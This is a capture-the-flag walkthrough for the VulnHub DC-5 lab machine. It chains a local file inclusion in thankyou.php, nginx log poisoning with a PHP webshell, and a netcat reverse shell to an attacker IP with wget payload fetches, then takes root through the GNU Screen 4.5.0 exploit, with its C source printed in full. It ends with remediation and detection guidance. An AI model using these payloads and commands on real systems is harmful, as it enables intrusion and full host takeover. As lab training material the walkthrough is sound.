# DC: 5 — When a Copyright Year Becomes Your Attack Vector

If you've ever dismissed a rotating copyright year at the bottom of a webpage as just a template glitch, DC: 5 will cure you of that habit permanently. That flicker between 2019 and 2020 on `thankyou.php` is the tell that a file inclusion vulnerability is present, and from there the chain runs all the way to root through log poisoning and a SUID binary that GNU Screen regrets shipping. Legit one of the most satisfying LFI-to-root progressions in the DC series.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | DC-5 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/dc-5,314/ |
| **Techniques** | Host discovery, nmap recon, LFI, nginx log poisoning, PHP RCE, SUID privesc |
| **CVEs** | CVE-2017-5618 (GNU Screen 4.5.0 SUID local root) |
| **CWEs** | CWE-22 (Path Traversal / LFI), CWE-284 (Improper Access Control) |
| **APT Groups** | APT41 (LFI chains in web-facing apps), FIN7 (log-based persistence and RCE) |

---

## Attack Summary

```
[netdiscover] → [nmap: port 80 nginx]
    → [browsing: contact form → thankyou.php]
    → [rotating copyright year → ?file= LFI discovered]
    → [LFI: /etc/passwd confirmed]
    → [LFI: /var/log/nginx/access.log confirmed readable]
    → [Burp: User-Agent → <?php system($_GET['cmd']); ?> injected into log]
    → [LFI + &cmd=id → RCE as www-data confirmed]
    → [nc listener + cmd=nc reverse shell → shell landed]
    → [find SUID: /bin/screen-4.5.0 → CVE-2017-5618 / EDB-41154]
    → [compile libhax.so + rootshell on attacker → wget to /tmp]
    → [./41154.sh → uid=0(root)]
    → [cat /root/thisistheflag.txt → FLAG]
```

---

## Methodology

1. Network host discovery and port enumeration with nmap.
2. Web application analysis: contact form, form submission response, and dynamic file parameter discovery.
3. LFI confirmation via path traversal in the `file` parameter.
4. Log poisoning: inject PHP webshell into nginx access log via User-Agent header.
5. Remote code execution via LFI + log inclusion and `cmd` parameter.
6. Reverse shell delivery and TTY upgrade.
7. SUID enumeration; identification of screen 4.5.0 (CVE-2017-5618).
8. Exploit compilation, transfer, and execution for root.

---

## Step 1 — Discovering the Target on the Network

Before touching anything, we need to know who we're talking to. In a local lab environment, `netdiscover` is the fastest way to sweep a subnet and find a freshly booted VM.

**Why netdiscover?** It works at Layer 2 (ARP), which means it finds hosts that might filter ICMP. VMs on host-only or bridged adapters always respond to ARP.

```bash
# -r specifies the subnet range to sweep
netdiscover -r 192.168.1.0/24
```

Expected output (relevant excerpt):

```
 192.168.1.108   00:0c:29:xx:xx:xx    1    60   VMware, Inc.
```

Target confirmed at `192.168.1.108`. You can also use `arp-scan --localnet` or `nmap -sn 192.168.1.0/24` if you prefer.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Port Enumeration and Service Fingerprinting

With the IP in hand, we run a full aggressive scan. The `-A` flag enables OS detection, version detection, script scanning, and traceroute in one pass.

```bash
# -A: aggressive mode (OS, version, scripts, traceroute)
# No -p- here since we want a quick first look
nmap -A 192.168.1.108
```

Expected output (key section):

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.6.2
| http-title: Welcome
|_http-server-header: nginx/1.6.2
```

Only port 80 is open. This is an nginx web server, which matters later for log poisoning since nginx and Apache log to different paths. Note that down.

**MITRE ATT&CK:** T1592 — Gather Victim Host Information

---

## Step 3 — Web Application Recon: Finding the LFI Tell

Browse to `http://192.168.1.108`. There's a site with a navigation bar and a contact form at `/contact.php`. Submit the form with any dummy data. The server returns a thank-you page at:

```
http://192.168.1.108/thankyou.php
```

Here's where it gets interesting: hit **Refresh** a few times. The copyright year at the bottom alternates between 2019 and 2020. ¯\_(ツ)_/¯ That is not a CSS animation. That means the year is being pulled from an external file on each request, which is the classic fingerprint of a file inclusion vulnerability.

The URL doesn't show a parameter yet, but viewing the page source or using Burp to intercept the response reveals (or testing manually) a `file` parameter. Try appending it:

```
http://192.168.1.108/thankyou.php?file=footer2.php
```

The footer content changes. The parameter name is `file`, and the server is including files based on user input with zero sanitization.

**Real-world note:** LFI vulnerabilities are consistently in the OWASP Top 10 under A03 (Injection). In 2021, threat actors exploited LFI in Pulse Secure VPN (CVE-2021-22893) to bypass authentication and deploy webshells on enterprise networks before any patch was available. Same primitive, different scale.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application

---

## Step 4 — Local File Inclusion Confirmation and Log Path Discovery

Time to prove LFI and enumerate log file accessibility. We test with `/etc/passwd` first because it is always readable and has a recognizable output signature.

```bash
# Classic LFI traversal test — adjust the depth (../) based on server document root
curl "http://192.168.1.108/thankyou.php?file=../../../../../etc/passwd"
```

Expected output (excerpt):

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

LFI is confirmed. •̀ᴗ•́

Now we need to verify the nginx access log path. The default for nginx on Debian/Ubuntu is `/var/log/nginx/access.log`. Let's check:

```bash
curl "http://192.168.1.108/thankyou.php?file=../../../../../var/log/nginx/access.log"
```

The log content renders in the browser, showing HTTP requests in nginx combined log format. The web process (`www-data`) has read access to the log. This is the second piece of the puzzle.

**Alternatives:** If nginx logs were not readable, other targets include `/var/log/apache2/access.log` (Apache), `/proc/self/environ` (process environment injection), or `/var/mail/www-data` (mail log injection). The technique is the same: find a file that records attacker-controlled input and is readable through the LFI.

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 5 — Log Poisoning: Weaponizing nginx Access Logs

Here is where things get sinister. ԅ(≖‿≖ԅ) The nginx access log records the `User-Agent` header from every request. If we inject PHP code into that header, and the LFI later includes the log file, the PHP interpreter will execute our payload.

Use Burp Suite (or curl) to send a request with a PHP webshell in the User-Agent:

**In Burp Suite:**
1. Intercept any GET request to `http://192.168.1.108/`.
2. In the Proxy tab, modify the `User-Agent` header to:

```
User-Agent: <?php system($_GET['cmd']); ?>
```

3. Forward the request.

**Via curl (alternative):**

```bash
# -A sets the User-Agent string
curl -A "<?php system(\$_GET['cmd']); ?>" http://192.168.1.108/
```

The PHP payload is now written verbatim into `/var/log/nginx/access.log`. Every line in the log that contains our `User-Agent` entry now carries executable PHP code — waiting to be triggered.

**Why does this work?** nginx does not sanitize log entries. The log file is plain text. When the PHP interpreter processes the log via LFI, it executes any PHP tags it encounters. The file effectively becomes a webshell.

**Real-world note:** Log poisoning was documented in the wild against Apache servers in APT41 intrusions (2019-2020) where attackers injected PHP backdoors into access logs after gaining LFI through vulnerable web frameworks. FIN7 also used similar log-based persistence to maintain access after initial web exploitation.

**MITRE ATT&CK:** T1505.003 — Server Software Component: Web Shell

---

## Step 6 — Remote Code Execution via Log Inclusion

Now we include the poisoned log through the LFI and pass a command via the `cmd` parameter. The PHP webshell in the log will execute `system($_GET['cmd'])`.

```bash
# First, confirm RCE with 'id'
curl "http://192.168.1.108/thankyou.php?file=../../../../../var/log/nginx/access.log&cmd=id"
```

Expected output (embedded in the log content):

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

( ͡° ͜ʖ ͡°) We have RCE as `www-data`. Big brain moment.

**Pro tip:** If the log grows large and output becomes hard to read, pipe through `grep` on the attacker side or use `curl -s ... | grep -oP 'uid=.*'` to extract just the command output.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 7 — Reverse Shell and TTY Upgrade

RCE via GET parameter is functional but fragile. We want a proper interactive shell. Start a listener and deliver a reverse shell payload through the `cmd` parameter.

**Step 7a — Start the listener on the attacker machine:**

```bash
# -l: listen mode, -v: verbose, -n: no DNS, -p: port
nc -lvnp 1234
```

**Step 7b — Deliver the reverse shell payload (URL-encoded):**

```bash
# The payload: nc -e /bin/bash <attacker_ip> <port>
# URL-encode spaces and special characters for delivery via GET parameter
curl "http://192.168.1.108/thankyou.php?file=../../../../../var/log/nginx/access.log&cmd=nc%20-e%20/bin/bash%20192.168.1.110%201234"
```

Shell lands on the listener: ᕕ( ᐛ )ᕗ

**Step 7c — Upgrade to a proper TTY:**

```bash
# Spawn a pty using Python (Python 2 on older Debian)
python -c 'import pty; pty.spawn("/bin/bash")'
# Set terminal type for clear screen support
export TERM=xterm
```

You are now `www-data` on DC-5 with a stable shell.

**Alternatives for the reverse shell payload:**
- `bash -c 'bash -i >& /dev/tcp/192.168.1.110/1234 0>&1'` (Bash TCP redirect)
- `python -c 'import socket,os,pty; ...'` (Python shell)
- mkfifo one-liner (works when `nc -e` is not available, e.g., OpenBSD nc)

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 8 — SUID Enumeration: Finding screen 4.5.0

With a foothold as `www-data`, we need a path to root. The first standard check is SUID binaries. SUID (Set User ID) means the binary runs as its owner (often root) regardless of who executes it. A vulnerable SUID binary is a direct root escalation vector.

**Why check SUID first?** Because misconfigured SUID binaries are a persistent issue in older Linux installations, and they don't require network access or user interaction to exploit.

```bash
# find: search from root, -perm -u=s: find SUID bits set, -type f: files only
# 2>/dev/null: suppress permission errors on directories we can't read
find / -perm -u=s -type f 2>/dev/null
```

Expected output (relevant entry):

```
/bin/screen-4.5.0
```

ಠᴗಠ There it is. `/bin/screen-4.5.0` — a specific version of GNU Screen installed with its SUID bit intact. Screen 4.5.0 is vulnerable to a local root privilege escalation documented in CVE-2017-5618 and Exploit-DB entry 41154. The vulnerability abuses a `logfile` feature to write to arbitrary files as root, combined with `LD_PRELOAD` via `ld.so.preload`.

**Real-world note:** The CVE-2017-5618 screen exploit has been used in CTF scenarios globally, but the underlying class (SUID binary with writable logging paths) appeared in real AWS EC2 instance compromises in 2020 where attackers pivoted from compromised web apps to root via misconfigured SUID tools.

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid

---

## Step 9 — Privilege Escalation via CVE-2017-5618 (EDB-41154)

The exploit consists of two C programs that must be compiled on the attacker machine (or a compatible architecture) and transferred to the target.

**Step 9a — On the attacker machine, obtain and prepare the exploit:**

```bash
# Pull the exploit script from ExploitDB
searchsploit screen 4.5.0
searchsploit -m 41154
```

The exploit script `41154.sh` embeds two C source files. Extract them:

**libhax.c** (loaded via LD_PRELOAD to run as root constructor):

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

**rootshell.c** (SUID shell that will be owned by root):

```c
#include <stdio.h>
int main(void){
    setuid(0); setgid(0); seteuid(0); setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

**Step 9b — Compile both on the attacker machine:**

```bash
# -fPIC: position-independent code for shared library
# -shared: build a shared object
# -ldl: link the dynamic linker library
gcc -fPIC -shared -ldl -o libhax.so libhax.c

# Standard binary compilation
gcc -o rootshell rootshell.c
```

**Step 9c — Serve and transfer to the target:**

```bash
# On attacker: start a web server in the exploit directory
python -m SimpleHTTPServer 8000     # Python 2
# python3 -m http.server 8000       # Python 3 (alternative)
```

On the target (via reverse shell):

```bash
cd /tmp
wget http://192.168.1.110:8000/41154.sh
wget http://192.168.1.110:8000/libhax.so
wget http://192.168.1.110:8000/rootshell
chmod +x 41154.sh
./41154.sh
id
```

Expected output:

```
~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Dropping suid shell in /tmp...
[+] done!
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/.screen.
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

(☞ﾟヮﾟ)☞ Root shell. GG.

**MITRE ATT&CK:** T1068 — Exploitation for Privilege Escalation

---

## Step 10 — Root Flag

```bash
cd /root
ls -la
cat thisistheflag.txt
```

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Root flag | (contents of `/root/thisistheflag.txt`) | `/root/thisistheflag.txt` | Read directly as root |
| Web process user | `www-data` | LFI + log poisoning RCE | Used for initial shell |
| SUID binary | `/bin/screen-4.5.0` | SUID enumeration | Exploited via CVE-2017-5618 |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Rotating copyright year revealed dynamic file inclusion | Any dynamic content fetched per-request is a candidate for LFI testing | Never pass user-controlled input directly to file inclusion functions |
| 2 | nginx access log readable by web process | Log poisoning is possible on any server where logs are world-readable or readable by the web process | Restrict log permissions: `root:adm 640` at minimum |
| 3 | PHP webshell injected via User-Agent header | APT41 and FIN7 have used HTTP header injection to plant backdoors in logs | Monitor for PHP tags in HTTP request headers via WAF or IDS rules |
| 4 | SUID bit set on screen 4.5.0 (CVE-2017-5618) | Old SUID binaries on production servers are a persistent root risk | Audit SUID/GUID binaries quarterly; remove SUID from binaries that do not require it |
| 5 | No input sanitization on `file` parameter | Unvalidated file inclusion is a top-10 web vulnerability category | Whitelist allowed values; never construct file paths from raw user input |

The combination of LFI and log poisoning is a no cap classic chain. It is worth internalizing: whenever you find LFI, immediately think about what log files the web process can read, what HTTP headers are logged, and whether any of those headers appear in an executable context. This chain appears in real-world intrusions against PHP applications that have existed since the mid-2000s, and it is still nailed by attackers today against unpatched or misconfigured servers.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | Gather Victim Host Information | T1592 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistence | Persistence | Server Software Component: Web Shell | T1505.003 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Lateral Movement | Lateral Movement | Ingress Tool Transfer | T1105 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control Mechanism: Setuid and Setgid | T1548.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Remove the `file` parameter entirely** from `thankyou.php`. If dynamic content is needed, use a server-side map (array keyed by integer ID) and never accept filenames from user input.
2. **Restrict nginx log permissions** to `root:adm 640`. The `www-data` user must not be able to read access logs.
3. **Remove the SUID bit from screen:** `chmod u-s /bin/screen-4.5.0`. Upgrade to a patched version of screen if terminal multiplexing is required.
4. **Implement input validation** on all query string parameters: reject path separators (`../`, `/`), null bytes, and any input that matches a file path pattern.
5. **Deploy a WAF rule** to block PHP tags (`<?php`) in User-Agent, Referer, and other logged HTTP headers.
6. **Audit all SUID/GUID binaries** on a schedule: `find / -perm /6000 -type f 2>/dev/null` and cross-reference with CVE databases.
7. **Run the web server as a dedicated, resource-isolated user** with minimal filesystem permissions; mount `/var/log/nginx` with restricted access.

### If You Find This in Your Environment

- Immediately check nginx (or Apache) access logs for PHP tags in User-Agent or Referer fields.
- Search for webshells in log-included directories: `grep -r '<?php' /var/log/nginx/`.
- Audit active connections from the web server process: `ss -tp | grep www-data`.
- Check for SUID screen installations: `find / -name "screen*" -perm -u=s 2>/dev/null`.
- Review `/etc/passwd` and `/etc/sudoers` for unauthorized changes.
- Revoke any web-facing file inclusion parameters and force a config review.

### MITRE D3FEND Countermeasures

- **D3-HBPI** (Hardware-Based Process Isolation): isolate web server processes.
- **D3-UAP** (User Account Permissions): enforce least privilege on web process accounts.
- **D3-SFA** (Software Feature Analysis): audit enabled PHP modules and SUID binaries.

### NIST CSF 2.0

| Function | Action |
|---|---|
| Identify | Inventory all SUID binaries and web application input vectors; classify log file sensitivity |
| Protect | Enforce least privilege on log file ACLs; disable user-controlled file inclusion; patch SUID binaries |
| Detect | Alert on PHP tags in HTTP request logs; monitor SUID binary executions via auditd |
| Respond | Isolate the web server; revoke web-facing file inclusion; rotate credentials |
| Recover | Restore clean web application config; patch screen; re-audit SUID binaries |

### NIST SP 800-53 Rev. 5

| Control | Description | Applicability |
|---|---|---|
| SI-10 | Information Input Validation | Validate `file` parameter against a strict whitelist |
| SI-3 | Malicious Code Protection | Deploy WAF to block PHP tag injection in headers |
| AC-6 | Least Privilege | Web process must not read log files; SUID bits audited |
| CM-7 | Least Functionality | Remove SUID from screen; disable unused PHP features |
| AU-2 | Event Logging | Log HTTP header anomalies; detect PHP in User-Agent |
| SC-7 | Boundary Protection | Network segment web server; restrict outbound connections |

### CISA KEV

CVE-2017-5618 (GNU Screen 4.5.0 SUID local privilege escalation) is not currently listed in the CISA Known Exploited Vulnerabilities catalog (it is a local-only exploit). However, the LFI + log poisoning chain enabling initial access has been exploited in campaigns tracked by CISA. Organizations should treat any unauthenticated LFI in an internet-facing application as KEV-severity.

### C2M2 (Cybersecurity Capability Maturity Model)

| Domain | Practice | Target MIL |
|---|---|---|
| Vulnerability Management (VM) | Identify and remediate SUID vulnerabilities | MIL2 |
| Configuration Management (CM) | Restrict log permissions; disable dynamic file inclusion | MIL2 |
| Situational Awareness (SA) | Monitor web logs for injection patterns | MIL3 |

### CIS Controls v8

- Control 4 (Secure Configuration): enforce secure nginx and PHP configs.
- Control 7 (Continuous Vulnerability Management): scan for SUID CVEs.
- Control 13 (Network Monitoring): detect anomalous outbound connections from web process.

---

## Final Thoughts

DC: 5 is a solid demonstration that the most impactful vulnerabilities are often the simplest: a rotating copyright year leaks the existence of LFI, a world-readable log file becomes a webshell delivery mechanism, and a forgotten SUID binary from 2017 hands over root. No fancy frameworks needed, no zero-days, just clear-eyed enumeration and following each lead to its logical conclusion.

Big thanks to **DCAU7** for crafting a machine that rewards patience and thorough web reconnaissance over brute-force tooling. The log poisoning path in particular is a W move for teaching why HTTP headers are attack surface and why log permissions matter outside of compliance checklists.

If this writeup helped you level up, share it with your crew and keep pushing through the DC series. Each one has its own flavor of "think outside the box."

Thanks guys!! (❍ᴥ❍ʋ)
